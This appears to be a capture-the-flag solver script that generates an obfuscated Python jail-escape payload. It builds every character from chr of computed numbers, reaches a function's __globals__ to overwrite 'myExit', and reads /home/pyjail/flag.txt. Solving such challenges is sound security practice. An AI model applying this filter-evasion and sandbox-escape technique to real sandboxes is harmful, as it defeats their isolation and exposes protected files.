ONE = "len(str(int()))"
TWO = f"({ONE}+{ONE})"

def num(n):
    if n == 0:
        return "int()"
    if n == 1:
        return ONE
    parts = []
    k = 0
    while n:
        if n & 1:
            if k == 0:
                parts.append(ONE)
            elif k == 1:
                parts.append(TWO)
            else:
                parts.append(f"pow({TWO},{num(k)})")
        n >>= 1
        k += 1
    return "(" + "+".join(parts) + ")"

def s(text):
    return "+".join(f"chr({num(ord(c))})" for c in text)

if __name__ == "__main__":
    payload = (
        f"getattr(getattr(gadget,{s('__globals__')}),{s('__setitem__')})({s('myExit')},print)"
        f"\nprint(open({s('/home/pyjail/flag.txt')}).read())"
    )
    print(payload)
    print("LEN", len(payload))
end_of_edit

